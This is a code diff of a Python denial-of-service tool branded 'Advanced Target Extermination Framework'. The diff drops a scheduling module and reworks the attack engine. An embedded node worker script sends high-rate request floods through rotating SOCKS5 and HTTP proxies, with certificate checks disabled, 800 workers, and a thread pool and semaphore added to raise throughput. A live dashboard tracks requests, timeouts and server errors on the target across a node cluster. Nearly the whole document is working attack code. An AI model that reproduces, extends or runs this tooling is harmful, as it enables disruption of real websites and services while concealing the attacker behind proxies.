@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import asyncio
-import shutil
 import aiohttp
 import random
 import string
@@ -10,25 +9,10 @@ import sys
 import json
 import base64
 import signal
-import socket
 import ssl as ssl_lib
-import calendar
-from datetime import datetime, timedelta, time as dtime
-from urllib.parse import urlparse
+import shutil
+from datetime import datetime
 import getpass
-
-try:
-    import termios
-    import tty
-    _HAS_TERMIOS = True
-except ImportError:
-    _HAS_TERMIOS = False
-
-try:
-    from zoneinfo import ZoneInfo
-    _ZONEINFO_AVAILABLE = True
-except ImportError:
-    _ZONEINFO_AVAILABLE = False
 
 try:
     sys.stdin.reconfigure(encoding='utf-8', errors='replace')
@@ -54,83 +38,10 @@ PROXY_SSL_CTX.check_hostname = False
 PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE
 
 NODES_FILE = "nodes.json"
-SCHEDULE_FILE = "schedule.json"
-TIMEZONE_FILE = "timezone.json"
 DEFAULT_RPS = 800
-DEFAULT_WORKERS = 1800
-DEFAULT_DURATION_MIN = 30
-
-WEEKDAYS_SHORT = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
-WEEKDAYS_FULL = ["Monday", "Tuesday", "Wednesday", "Thursday",
-                 "Friday", "Saturday", "Sunday"]
+DEFAULT_WORKERS = 800
 
 _INTERRUPTED = [False]
-
-_TZ_TEHRAN = [False]
-_TEHRAN_ZONE = None
-
-
-class MenuBack(Exception):
-    pass
-
-
-def safe_input(prompt=""):
-    try:
-        return input(prompt)
-    except (KeyboardInterrupt, EOFError):
-        raise MenuBack()
-
-
-def safe_getpass(prompt=""):
-    try:
-        return getpass.getpass(prompt)
-    except (KeyboardInterrupt, EOFError):
-        raise MenuBack()
-    except Exception:
-        return safe_input(prompt)
-
-
-def _init_tehran_zone():
-    global _TEHRAN_ZONE
-    if _ZONEINFO_AVAILABLE:
-        try:
-            _TEHRAN_ZONE = ZoneInfo("Asia/Tehran")
-            return
-        except Exception:
-            pass
-    _TEHRAN_ZONE = None
-
-
-def load_timezone():
-    try:
-        if os.path.exists(TIMEZONE_FILE):
-            with open(TIMEZONE_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            _TZ_TEHRAN[0] = bool(data.get("tehran", False))
-    except Exception:
-        _TZ_TEHRAN[0] = False
-
-
-def save_timezone():
-    try:
-        with open(TIMEZONE_FILE, "w", encoding="utf-8") as f:
-            json.dump({"tehran": _TZ_TEHRAN[0]}, f)
-    except Exception:
-        pass
-
-
-def now_dt():
-    if _TZ_TEHRAN[0]:
-        if _TEHRAN_ZONE is not None:
-            return datetime.now(_TEHRAN_ZONE).replace(tzinfo=None)
-        return datetime.utcnow() + timedelta(hours=3, minutes=30)
-    return datetime.now()
-
-
-def tz_label():
-    if _TZ_TEHRAN[0]:
-        return f"{Colors.YELLOW}Tehran (UTC+3:30){Colors.RESET}"
-    return f"{Colors.DIM}Local system time{Colors.RESET}"
 
 
 def _restore_terminal():
@@ -166,266 +77,12 @@ async def interruptible_sleep(seconds):
         await asyncio.sleep(min(0.5, max(0.05, remaining)))
 
 
-# =====================================================================
-#  SCHEDULE ENGINE
-# =====================================================================
-
-class ScheduleSlot:
-    TYPE = "base"
-
-    def to_dict(self):
-        return {"type": self.TYPE, **self._data()}
-
-    def _data(self):
-        return {}
-
-    def current_or_next_window(self, now):
-        return None
-
-    def describe(self):
-        return "?"
-
-    @staticmethod
-    def from_dict(d):
-        t = d.get("type")
-        try:
-            if t == "absolute":
-                return AbsoluteSlot(d["start"], d["end"])
-            if t == "daily":
-                return DailySlot(d["start_time"], d["end_time"],
-                                 d.get("days"), d.get("skip_days") or [])
-            if t == "monthly":
-                return MonthlySlot(d["day_of_month"],
-                                   d["start_time"], d["end_time"])
-            if t == "hourly":
-                return HourlySlot(d["start_minute"], d["duration_min"])
-        except Exception:
-            return None
-        return None
-
-
-class AbsoluteSlot(ScheduleSlot):
-    TYPE = "absolute"
-
-    def __init__(self, start, end):
-        self.start = start
-        self.end = end
-
-    def _data(self):
-        return {"start": self.start, "end": self.end}
-
-    def _parse(self):
-        s = datetime.strptime(self.start, "%Y-%m-%d %H:%M")
-        e = datetime.strptime(self.end, "%Y-%m-%d %H:%M")
-        return s, e
-
-    def current_or_next_window(self, now):
-        try:
-            s, e = self._parse()
-        except Exception:
-            return None
-        if e <= now:
-            return None
-        return (s, e)
-
-    def describe(self):
-        return f"Absolute · {self.start}  →  {self.end}"
-
-
-class DailySlot(ScheduleSlot):
-    TYPE = "daily"
-
-    def __init__(self, start_time, end_time, days=None, skip_days=None):
-        self.start_time = start_time
-        self.end_time = end_time
-        self.days = days
-        self.skip_days = skip_days or []
-
-    def _data(self):
-        return {
-            "start_time": self.start_time,
-            "end_time": self.end_time,
-            "days": self.days,
-            "skip_days": self.skip_days,
-        }
-
-    def _t(self, base_date, time_str):
-        h, m = map(int, time_str.split(":"))
-        return datetime.combine(base_date, dtime(h, m))
-
-    def _day_allowed(self, weekday):
-        if weekday in self.skip_days:
-            return False
-        if self.days is None:
-            return True
-        return weekday in self.days
-
-    def current_or_next_window(self, now):
-        for offset in range(0, 10):
-            day = (now + timedelta(days=offset)).date()
-            wd = day.weekday()
-            if not self._day_allowed(wd):
-                continue
-            try:
-                s = self._t(day, self.start_time)
-                e = self._t(day, self.end_time)
-            except Exception:
-                continue
-            if e <= s:
-                e += timedelta(days=1)
-            if e <= now:
-                continue
-            return (s, e)
-        return None
-
-    def describe(self):
-        if self.days is None:
-            days_txt = "every day"
-        else:
-            days_txt = ", ".join(WEEKDAYS_SHORT[d] for d in sorted(self.days))
-        skip_txt = ""
-        if self.skip_days:
-            skip_txt = "  (skip " + ", ".join(
-                WEEKDAYS_SHORT[d] for d in sorted(self.skip_days)) + ")"
-        return (f"Daily · {self.start_time} → {self.end_time} "
-                f"on {days_txt}{skip_txt}")
-
-
-class MonthlySlot(ScheduleSlot):
-    TYPE = "monthly"
-
-    def __init__(self, day_of_month, start_time, end_time):
-        self.day_of_month = day_of_month
-        self.start_time = start_time
-        self.end_time = end_time
-
-    def _data(self):
-        return {
-            "day_of_month": self.day_of_month,
-            "start_time": self.start_time,
-            "end_time": self.end_time,
-        }
-
-    def current_or_next_window(self, now):
-        for month_offset in range(0, 14):
-            y = now.year
-            m = now.month + month_offset
-            while m > 12:
-                m -= 12
-                y += 1
-            max_day = calendar.monthrange(y, m)[1]
-            d = min(self.day_of_month, max_day)
-            try:
-                h1, m1 = map(int, self.start_time.split(":"))
-                h2, m2 = map(int, self.end_time.split(":"))
-                s = datetime(y, m, d, h1, m1)
-                e = datetime(y, m, d, h2, m2)
-            except Exception:
-                continue
-            if e <= s:
-                e += timedelta(days=1)
-            if e <= now:
-                continue
-            return (s, e)
-        return None
-
-    def describe(self):
-        return (f"Monthly · day {self.day_of_month}  "
-                f"{self.start_time} → {self.end_time}")
-
-
-class HourlySlot(ScheduleSlot):
-    TYPE = "hourly"
-
-    def __init__(self, start_minute, duration_min):
-        self.start_minute = start_minute
-        self.duration_min = duration_min
-
-    def _data(self):
-        return {
-            "start_minute": self.start_minute,
-            "duration_min": self.duration_min,
-        }
-
-    def current_or_next_window(self, now):
-        for offset in range(0, 26):
-            base = (now + timedelta(hours=offset)).replace(
-                minute=self.start_minute, second=0, microsecond=0
-            )
-            e = base + timedelta(minutes=self.duration_min)
-            if e <= now:
-                continue
-            return (base, e)
-        return None
-
-    def describe(self):
-        return (f"Hourly · at :{self.start_minute:02d}, "
-                f"runs {self.duration_min} min")
-
-
-class ScheduleManager:
-    def __init__(self):
-        self.slots = []
-        self.load()
-
-    def is_empty(self):
-        return not self.slots
-
-    def clear(self):
-        self.slots = []
-        self.save()
-
-    def add(self, slot):
-        self.slots.append(slot)
-        self.save()
-
-    def load(self):
-        if not os.path.exists(SCHEDULE_FILE):
-            return
-        try:
-            with open(SCHEDULE_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            for d in data.get("slots", []):
-                s = ScheduleSlot.from_dict(d)
-                if s is not None:
-                    self.slots.append(s)
-        except Exception:
-            self.slots = []
-
-    def save(self):
-        try:
-            with open(SCHEDULE_FILE, "w", encoding="utf-8") as f:
-                json.dump(
-                    {"slots": [s.to_dict() for s in self.slots]},
-                    f, indent=2, ensure_ascii=False
-                )
-        except Exception:
-            pass
-
-    def describe(self):
-        return [s.describe() for s in self.slots]
-
-    def next_window(self, now=None):
-        now = now or now_dt()
-        candidates = []
-        for slot in self.slots:
-            try:
-                w = slot.current_or_next_window(now)
-            except Exception:
-                w = None
-            if w is not None:
-                candidates.append(w)
-        if not candidates:
-            return None
-        active = [w for w in candidates if w[0] <= now < w[1]]
-        if active:
-            return max(active, key=lambda w: w[1])
-        return min(candidates, key=lambda w: w[0])
-
-
+# ==================================================================
+#    HIGH-PERFORMANCE NODE WORKER SCRIPT
+# ==================================================================
 NODE_SCRIPT = r'''#!/usr/bin/env python3
 import asyncio, ssl, random, string, sys, json, time, os, signal, base64
-import socket as _socket, ipaddress as _ipaddress, threading
+import socket as _socket, ipaddress as _ipaddress, concurrent.futures, threading
 from urllib.parse import urlparse
 
 STATUS_FILE = "/tmp/node_attack_status.json"
@@ -565,45 +222,33 @@ def pick_proxy():
     return None
 
 
-async def _async_connect(proxy, host, port, timeout):
-    loop = asyncio.get_running_loop()
-
+def _sync_connect(proxy, host, port, use_ssl, timeout):
+    """Returns a PLAIN TCP socket. SSL handshake is done by asyncio later."""
     if proxy is None:
-        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
-        sock.setblocking(False)
-        try:
-            await asyncio.wait_for(loop.sock_connect(sock, (host, port)),
-                                   timeout=timeout)
-        except Exception:
-            try:
-                sock.close()
-            except Exception:
-                pass
-            raise
-        return sock
+        s = _socket.create_connection((host, port), timeout=timeout)
+        s.setblocking(False)
+        return s
 
     scheme, phost, pport, puser, ppwd = proxy
-    sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
-    sock.setblocking(False)
+    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
     try:
-        await asyncio.wait_for(loop.sock_connect(sock, (phost, pport)),
-                               timeout=timeout)
+        s.settimeout(timeout)
+        s.connect((phost, pport))
 
         if scheme == "socks5":
             if puser:
-                await asyncio.wait_for(loop.sock_sendall(sock, b"\x05\x02\x00\x02"), timeout=timeout)
+                s.sendall(b"\x05\x02\x00\x02")
             else:
-                await asyncio.wait_for(loop.sock_sendall(sock, b"\x05\x01\x00"), timeout=timeout)
-            hdr = await asyncio.wait_for(loop.sock_recv(sock, 2), timeout=timeout)
+                s.sendall(b"\x05\x01\x00")
+            hdr = s.recv(2)
             if len(hdr) != 2 or hdr[0] != 0x05:
                 raise Exception("socks5: bad greeting")
             method = hdr[1]
             if method == 0x02:
                 u = (puser or "").encode()
                 pw = (ppwd or "").encode()
-                payload = bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw
-                await asyncio.wait_for(loop.sock_sendall(sock, payload), timeout=timeout)
-                auth = await asyncio.wait_for(loop.sock_recv(sock, 2), timeout=timeout)
+                s.sendall(bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw)
+                auth = s.recv(2)
                 if len(auth) != 2 or auth[1] != 0x00:
                     raise Exception("socks5: auth failed")
             elif method != 0x00:
@@ -619,19 +264,19 @@ async def _async_connect(proxy, host, port, timeout):
                 addr = bytes([len(hb)]) + hb
 
             req = bytes([0x05, 0x01, 0x00, atyp]) + addr + port.to_bytes(2, "big")
-            await asyncio.wait_for(loop.sock_sendall(sock, req), timeout=timeout)
-            resp = await asyncio.wait_for(loop.sock_recv(sock, 4), timeout=timeout)
+            s.sendall(req)
+            resp = s.recv(4)
             if len(resp) < 4 or resp[1] != 0x00:
                 code = resp[1] if len(resp) > 1 else -1
                 raise Exception(f"socks5: connect failed code={code}")
             if resp[3] == 0x01:
-                await asyncio.wait_for(loop.sock_recv(sock, 6), timeout=timeout)
+                s.recv(6)
             elif resp[3] == 0x03:
-                ln = await asyncio.wait_for(loop.sock_recv(sock, 1), timeout=timeout)
+                ln = s.recv(1)
                 if ln:
-                    await asyncio.wait_for(loop.sock_recv(sock, ln[0] + 2), timeout=timeout)
+                    s.recv(ln[0] + 2)
             elif resp[3] == 0x04:
-                await asyncio.wait_for(loop.sock_recv(sock, 18), timeout=timeout)
+                s.recv(18)
 
         elif scheme in ("http", "https"):
             req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
@@ -639,11 +284,11 @@ async def _async_connect(proxy, host, port, timeout):
                 token = base64.b64encode(f"{puser}:{ppwd or ''}".encode()).decode()
                 req += f"Proxy-Authorization: Basic {token}\r\n"
             req += "Proxy-Connection: keep-alive\r\n\r\n"
-            await asyncio.wait_for(loop.sock_sendall(sock, req.encode()), timeout=timeout)
+            s.sendall(req.encode())
 
             buf = b""
             while b"\r\n\r\n" not in buf:
-                chunk = await asyncio.wait_for(loop.sock_recv(sock, 1024), timeout=timeout)
+                chunk = s.recv(1024)
                 if not chunk:
                     raise Exception("http-proxy: closed")
                 buf += chunk
@@ -653,10 +298,11 @@ async def _async_connect(proxy, host, port, timeout):
                 line = buf.split(b"\r\n", 1)[0].decode(errors="ignore")
                 raise Exception(f"http-proxy: {line}")
 
-        return sock
+        s.setblocking(False)
+        return s
     except Exception:
         try:
-            sock.close()
+            s.close()
         except Exception:
             pass
         raise
@@ -671,7 +317,9 @@ class Session:
     async def connect(self):
         await self.close()
         self.proxy = pick_proxy() if PROXIES else None
-        sock = await _async_connect(self.proxy, HOST, PORT, 10)
+        sock = await asyncio.to_thread(
+            _sync_connect, self.proxy, HOST, PORT, USE_SSL, 10
+        )
         if USE_SSL:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
@@ -767,6 +415,9 @@ class Session:
         return code
 
 
+CONNECT_SEM = None
+
+
 async def worker(worker_id):
     delay = (1.0 / RPS) if RPS and RPS > 0 else 0.0
     session = Session()
@@ -775,14 +426,24 @@ async def worker(worker_id):
     while RUNNING[0]:
         try:
             if not connected:
-                try:
-                    await session.connect()
-                    connected = True
-                    CONNECTED_COUNT[0] += 1
-                except Exception as e:
-                    ERROR_COUNT[0] += 1
-                    if ERROR_COUNT[0] % 500 == 0:
-                        log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
+                if CONNECT_SEM is not None:
+                    async with CONNECT_SEM:
+                        try:
+                            await session.connect()
+                            connected = True
+                            CONNECTED_COUNT[0] += 1
+                        except Exception as e:
+                            ERROR_COUNT[0] += 1
+                            if ERROR_COUNT[0] % 500 == 0:
+                                log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
+                else:
+                    try:
+                        await session.connect()
+                        connected = True
+                        CONNECTED_COUNT[0] += 1
+                    except Exception:
+                        ERROR_COUNT[0] += 1
+                if not connected:
                     await asyncio.sleep(0.2)
                     continue
 
@@ -844,6 +505,18 @@ async def worker(worker_id):
 
 
 async def main():
+    global CONNECT_SEM
+
+    try:
+        thread_count = min(max(WORKERS, 64), 500)
+        loop = asyncio.get_running_loop()
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=thread_count)
+        loop.set_default_executor(executor)
+    except Exception as e:
+        log(f"executor setup fail: {e}")
+
+    CONNECT_SEM = asyncio.Semaphore(min(max(WORKERS // 4, 64), 300))
+
     try:
         with open(PID_FILE, "w") as f:
             f.write(str(os.getpid()))
@@ -986,12 +659,8 @@ SAFE_MODE = SafeModeState()
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
-
 def print_banner():
     clear_screen()
-    now = now_dt()
-    ts = now.strftime("%A, %Y-%m-%d  %H:%M:%S")
-    tzlbl = tz_label()
     banner = f"""
 {Colors.RED}{Colors.BOLD}
   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
@@ -1002,16 +671,21 @@ def print_banner():
   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
 {Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
 {Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
-{Colors.YELLOW}                  ● Now: {ts}{Colors.RESET}  {Colors.DIM}·{Colors.RESET}  {tzlbl}
 """
     print(banner)
-
 
 def random_string(length=12):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 
 class LiveDashboard:
+    """Fixed-position dashboard that auto-fits terminal height.
+    - Uses alt-screen buffer (no interference with main terminal)
+    - Absolute cursor positioning — never auto-scrolls
+    - Each section dynamically sized to fit — all sections always visible
+    - Rows beyond terminal are shown as '... N more' (never dropped)
+    - Adaptive render rate based on attack throughput"""
+
     _THROTTLE_SEC = 3
     _RENDER_INTERVAL = 0.5
     _RENDER_INTERVAL_HEAVY = 1.0
@@ -1040,8 +714,6 @@ class LiveDashboard:
         self._active = False
         self._last_rps = 0
         self._last_size = (0, 0)
-        self._last_line_count = 0
-        self._old_termios = None
 
     @staticmethod
     def _term_size():
@@ -1062,7 +734,7 @@ class LiveDashboard:
             duration = float(duration)
         except Exception:
             duration = 600.0
-        if duration <= 0 or duration > 86400 * 365:
+        if duration <= 0 or duration > 86400 * 30:
             duration = 600.0
 
         self.enabled = True
@@ -1084,8 +756,6 @@ class LiveDashboard:
         self.rps_limit = int(rps_limit) if rps_limit else 0
         self._last_rps = 0
         self._last_size = (0, 0)
-        self._last_line_count = 0
-        self._old_termios = None
 
         if not self._is_tty:
             self.enabled = False
@@ -1093,14 +763,6 @@ class LiveDashboard:
             return
 
         try:
-            if _HAS_TERMIOS:
-                try:
-                    if sys.stdin.isatty():
-                        self._old_termios = termios.tcgetattr(sys.stdin.fileno())
-                        tty.setcbreak(sys.stdin.fileno())
-                except Exception:
-                    self._old_termios = None
-
             sys.stdout.write("\033[?1049h")
             sys.stdout.write("\033[?25l")
             sys.stdout.write("\033[2J\033[H")
@@ -1112,23 +774,8 @@ class LiveDashboard:
     def stop(self):
         self.enabled = False
         if not self._active:
-            if _HAS_TERMIOS and self._old_termios is not None:
-                try:
-                    termios.tcsetattr(sys.stdin.fileno(),
-                                      termios.TCSADRAIN, self._old_termios)
-                except Exception:
-                    pass
-                self._old_termios = None
             return
         try:
-            if _HAS_TERMIOS and self._old_termios is not None:
-                try:
-                    termios.tcsetattr(sys.stdin.fileno(),
-                                      termios.TCSADRAIN, self._old_termios)
-                except Exception:
-                    pass
-                self._old_termios = None
-
             sys.stdout.write("\033[?25h")
             sys.stdout.write("\033[?1049l")
             sys.stdout.flush()
@@ -1222,7 +869,7 @@ class LiveDashboard:
             seconds = 0.0
         if seconds < 0 or seconds != seconds:
             seconds = 0.0
-        seconds = min(seconds, 86400 * 365)
+        seconds = min(seconds, 86400 * 30)
         total = int(seconds)
         if total >= 3600:
             h = total // 3600
@@ -1233,6 +880,9 @@ class LiveDashboard:
         s = total % 60
         return f"{m:02d}:{s:02d}"
 
+    # ==================================================================
+    #  SECTION BUILDERS
+    # ==================================================================
     def _sec_header(self, budget):
         if budget < 4:
             return []
@@ -1306,7 +956,19 @@ class LiveDashboard:
             f"  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER{Colors.RESET}  "
             f"{Colors.DIM}({len(self.nodes)} nodes · {attacking} active){Colors.RESET}"
         )
-        for n in self.nodes:
+        row_budget = budget - 2
+        if row_budget < 1:
+            return lines + [""]
+
+        show_count = min(len(self.nodes), row_budget)
+        needs_more = len(self.nodes) > show_count
+        if needs_more and show_count > 0:
+            show_count -= 1
+
+        shown = self.nodes[:show_count]
+        for i, n in enumerate(shown):
+            is_last = (i == len(shown) - 1) and not needs_more
+            prefix = "└─" if is_last else "├─"
             req = getattr(n, "live_requests", 0)
             ok = getattr(n, "live_success", 0)
             to = getattr(n, "live_timeouts", 0)
@@ -1328,17 +990,25 @@ class LiveDashboard:
                 label = label[:19] + "..."
 
             lines.append(
-                f"  {Colors.DIM}├─{Colors.RESET} "
+                f"  {Colors.DIM}{prefix}{Colors.RESET} "
                 f"{label:<22}  "
                 f"REQ {req:>8,}  "
                 f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
                 f"{Colors.RED}TO {to:>7,}{Colors.RESET}  "
                 f"{Colors.RED}5xx {se:>6,}{Colors.RESET}  [{st}]"
             )
+
+        if needs_more:
+            remaining = len(self.nodes) - show_count
+            lines.append(
+                f"  {Colors.DIM}└─{Colors.RESET} "
+                f"{Colors.DIM}... and {remaining} more nodes{Colors.RESET}"
+            )
         lines.append("")
         return lines
 
     def _sec_proxies(self, budget):
+        """Proxy pool — 2-line summary (title + aggregate stats)."""
         try:
             proxy_sessions = list(PROXY_MANAGER.sessions.keys())
         except Exception:
@@ -1346,64 +1016,56 @@ class LiveDashboard:
         if budget < 2 or not proxy_sessions:
             return []
 
-        lines = []
+        total_req = 0
+        total_ok = 0
+        total_fail = 0
+        total_lat = 0
+        lat_count = 0
         alive_cnt = 0
+        dead_cnt = 0
+
         for p in proxy_sessions:
-            st = PROXY_MANAGER.proxy_stats.get(p, {})
-            if not st.get("dead", False):
-                alive_cnt += 1
-
-        lines.append(
-            f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
-            f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
-            f"{alive_cnt} alive / {len(proxy_sessions)} total){Colors.RESET}"
-        )
-
-        row_budget = min(4, budget - 2)
-        if row_budget < 1:
-            return lines + [""]
-
-        sorted_proxies = sorted(
-            proxy_sessions,
-            key=lambda p: PROXY_MANAGER.proxy_stats.get(p, {}).get("requests", 0),
-            reverse=True,
-        )
-        show_count = min(len(sorted_proxies), row_budget)
-        needs_more = len(sorted_proxies) > show_count
-        if needs_more and show_count > 0:
-            show_count -= 1
-
-        shown = sorted_proxies[:show_count]
-        for i, p in enumerate(shown):
-            is_last = (i == len(shown) - 1) and not needs_more
-            prefix = "└─" if is_last else "├─"
             st = PROXY_MANAGER.proxy_stats.get(p, {})
             req = st.get("requests", 0)
             ok = st.get("success", 0)
             fl = st.get("fails", 0)
             lat = st.get("latency_ms", 0)
             dead = st.get("dead", False)
-            status_str = (f"{Colors.RED}DEAD {Colors.RESET}"
-                          if dead else f"{Colors.GREEN}ALIVE{Colors.RESET}")
-            p_short = p
-            if len(p_short) > 42:
-                p_short = p_short[:39] + "..."
-            lines.append(
-                f"  {Colors.DIM}{prefix}{Colors.RESET} "
-                f"{Colors.MAGENTA}{p_short:<42}{Colors.RESET}  "
-                f"{status_str}  "
-                f"REQ {req:>7,}  "
-                f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
-                f"{Colors.RED}FAIL {fl:>5,}{Colors.RESET}  "
-                f"{Colors.DIM}{lat:>4}ms{Colors.RESET}"
-            )
 
-        if needs_more:
-            remaining = len(sorted_proxies) - show_count
-            lines.append(
-                f"  {Colors.DIM}└─{Colors.RESET} "
-                f"{Colors.DIM}... and {remaining} more proxies{Colors.RESET}"
-            )
+            total_req += req
+            total_ok += ok
+            total_fail += fl
+            if lat > 0:
+                total_lat += lat
+                lat_count += 1
+            if dead:
+                dead_cnt += 1
+            else:
+                alive_cnt += 1
+
+        avg_lat = int(total_lat / lat_count) if lat_count > 0 else 0
+
+        if total_req > 0:
+            success_rate = (total_ok / total_req) * 100
+        else:
+            success_rate = 0.0
+
+        lines = []
+        lines.append(
+            f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
+            f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
+            f"{Colors.GREEN}{alive_cnt} alive{Colors.RESET}{Colors.DIM} / "
+            f"{Colors.RED}{dead_cnt} dead{Colors.RESET}{Colors.DIM} / "
+            f"{len(proxy_sessions)} total){Colors.RESET}"
+        )
+        lines.append(
+            f"  {Colors.DIM}└─{Colors.RESET} "
+            f"REQ {Colors.BOLD}{total_req:>10,}{Colors.RESET}  "
+            f"{Colors.GREEN}OK {total_ok:>9,}{Colors.RESET}  "
+            f"{Colors.RED}FAIL {total_fail:>8,}{Colors.RESET}  "
+            f"{Colors.CYAN}SUCCESS {success_rate:>5.1f}%{Colors.RESET}  "
+            f"{Colors.DIM}AVG-LAT {avg_lat:>5}ms{Colors.RESET}"
+        )
         lines.append("")
         return lines
 
@@ -1411,28 +1073,45 @@ class LiveDashboard:
         if budget < 2 or not self.events:
             return []
         lines = [f"  {Colors.BOLD}● LIVE EVENTS{Colors.RESET}"]
-        for name, count in sorted(self.events.items()):
+        row_budget = budget - 2
+        if row_budget < 1:
+            return lines + [""]
+
+        event_items = sorted(self.events.items())
+        show_count = min(len(event_items), row_budget)
+        needs_more = len(event_items) > show_count
+        if needs_more and show_count > 0:
+            show_count -= 1
+
+        shown = event_items[:show_count]
+        for i, (name, count) in enumerate(shown):
+            is_last = (i == len(shown) - 1) and not needs_more
+            prefix = "└─" if is_last else "├─"
             color = self._event_color(name)
             lines.append(
-                f"  {Colors.DIM}├─{Colors.RESET} "
+                f"  {Colors.DIM}{prefix}{Colors.RESET} "
                 f"{color}{name:<38}{Colors.RESET}  "
                 f"{Colors.BOLD}{count:>10,}{Colors.RESET}"
             )
+        if needs_more:
+            remaining = len(event_items) - show_count
+            lines.append(f"  {Colors.DIM}└─{Colors.RESET} "
+                         f"{Colors.DIM}... and {remaining} more events{Colors.RESET}")
         lines.append("")
         return lines
 
     def _sec_activity(self, budget):
+        """Recent activity — capped at 4 rows (newest first)."""
         if budget < 2 or not self.recent_logs:
             return []
         lines = [f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}"]
 
-        row_budget = min(5, budget - 2)
-        if row_budget < 1:
+        max_rows = min(4, budget - 2)
+        if max_rows < 1:
             return lines + [""]
 
         logs = list(reversed(self.recent_logs))
-        show_count = min(len(logs), row_budget)
-        shown = logs[:show_count]
+        shown = logs[:max_rows]
         for status_type, msg, ts in shown:
             ts_str = time.strftime("%H:%M:%S", time.localtime(ts))
             pfx = self._log_prefix(status_type)
@@ -1448,60 +1127,91 @@ class LiveDashboard:
             f"{time.strftime('%H:%M:%S')}{Colors.RESET}",
         ]
 
+    # ==================================================================
+    #  ALLOCATION
+    # ==================================================================
     def _allocate_budgets(self, total_rows):
         HEADER_MIN = 4
         ATTACK_MIN = 5
-        ATTACK_FULL = 9
         FOOTER_MIN = 1
-        PROXIES_FIXED = 6
-        ACTIVITY_FIXED = 7
 
-        events_need = (len(self.events) + 2) if self.events else 0
-        nodes_need = (len(self.nodes) + 2) if self.nodes else 0
+        OPTIONAL = ["nodes", "events", "proxies", "activity"]
 
         header = HEADER_MIN
-        attack = ATTACK_FULL
+        attack = 9
         footer = FOOTER_MIN
-        proxies = PROXIES_FIXED
-        activity = ACTIVITY_FIXED
-        events = events_need
-        nodes = nodes_need
 
-        def total():
-            return (header + attack + footer + proxies +
-                    activity + events + nodes)
+        reserved = header + attack + footer
+        available = total_rows - reserved
 
-        if total() > total_rows:
-            excess = total() - total_rows
-            take = min(excess, activity)
-            activity -= take
-        if total() > total_rows:
-            excess = total() - total_rows
-            take = min(excess, proxies)
-            proxies -= take
-        if total() > total_rows:
+        if available < 0:
             attack = ATTACK_MIN
-        if total() > total_rows:
-            header = 0
-        if total() > total_rows:
-            excess = total() - total_rows
-            take = min(excess, attack)
-            attack -= take
-        if total() > total_rows:
-            attack = 0
-            header = 0
+            reserved = header + attack + footer
+            available = total_rows - reserved
 
-        budgets = {
-            "header": header,
-            "attack": attack,
-            "footer": footer,
-            "proxies": proxies,
-            "activity": activity,
-            "events": events,
-            "nodes": nodes,
-        }
+        if available < 0:
+            header = 0
+            reserved = header + attack + footer
+            available = total_rows - reserved
+
+        if available < 0:
+            attack = 0
+            reserved = header + attack + footer
+            available = total_rows - reserved
+
+        if available < 0:
+            footer = min(total_rows, 1)
+            available = total_rows - footer
+            header = 0
+            attack = 0
+
+        budgets = {"header": header, "attack": attack, "footer": footer,
+                   "nodes": 0, "events": 0, "proxies": 0, "activity": 0}
+
+        if available <= 0:
+            return budgets
+
+        # Proxies only need 2 lines now, activity only 4
+        weights = {"nodes": 4, "events": 4, "proxies": 1, "activity": 1}
+        total_weight = sum(weights.values())
+
+        distributed = 0
+        for sec in OPTIONAL:
+            share = (available * weights[sec]) // total_weight
+            budgets[sec] = share
+            distributed += share
+
+        remainder = available - distributed
+        for sec in OPTIONAL:
+            if remainder <= 0:
+                break
+            if budgets[sec] < 2:
+                need = 2 - budgets[sec]
+                add = min(need, remainder)
+                budgets[sec] += add
+                remainder -= add
+
+        # Enforce minimums per section
+        MINIMUMS = {"nodes": 4, "events": 4, "proxies": 2, "activity": 2}
+        for sec in OPTIONAL:
+            min_req = MINIMUMS.get(sec, 2)
+            if 0 < budgets[sec] < min_req:
+                budgets[sec] = 0
+
+        # Redistribute dropped rows
+        dropped_rows = sum(budgets[sec] for sec in OPTIONAL if budgets[sec] == 0)
+        if dropped_rows > 0:
+            active = [s for s in OPTIONAL if budgets[s] >= 2]
+            if active:
+                per_sec = dropped_rows // len(active)
+                for sec in active:
+                    budgets[sec] += per_sec
+
         return budgets
 
+    # ==================================================================
+    #  RENDER
+    # ==================================================================
     def render(self, force=False):
         if not self.enabled or not self._active:
             return
@@ -1530,7 +1240,7 @@ class LiveDashboard:
             if elapsed < 0 or elapsed != elapsed:
                 elapsed = 0.0
             remaining = max(0.0, self.duration - elapsed)
-            if remaining > 86400 * 365:
+            if remaining > 86400 * 30:
                 remaining = 0.0
 
             budgets = self._allocate_budgets(max_total_lines)
@@ -1544,31 +1254,24 @@ class LiveDashboard:
             footer_lines = self._sec_footer(budgets["footer"])
 
